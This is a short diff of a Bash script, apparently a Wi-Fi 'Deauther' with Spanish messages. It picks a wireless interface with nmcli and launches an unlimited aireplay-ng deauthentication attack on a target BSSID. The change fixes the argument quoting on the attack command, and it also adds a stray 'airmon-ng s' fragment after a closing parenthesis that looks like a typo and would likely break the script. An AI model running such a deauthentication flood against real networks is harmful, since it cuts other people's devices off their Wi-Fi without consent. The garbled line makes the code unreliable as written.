@@ -7,7 +7,7 @@ echo -e "\n"
 # 1) Interfaces Wi-Fi
 mapfile -t IFACES < <(
   nmcli -t -f DEVICE,TYPE device status | awk -F: '$2=="wifi"{print $1}'
-)
+)airmon-ng s
 
 [ ${#IFACES[@]} -eq 0 ] && { echo "No se encontraron interfaces WIFI disponibles"; exit 1; }
 
@@ -69,4 +69,4 @@ done
 echo
 echo "Ejecutando Deauther..."
 echo -e "\n"
-aireplay-ng --deauth 0 -a "$BSSID $IFACE"
+aireplay-ng --deauth 0 -a $BSSID $IFACE
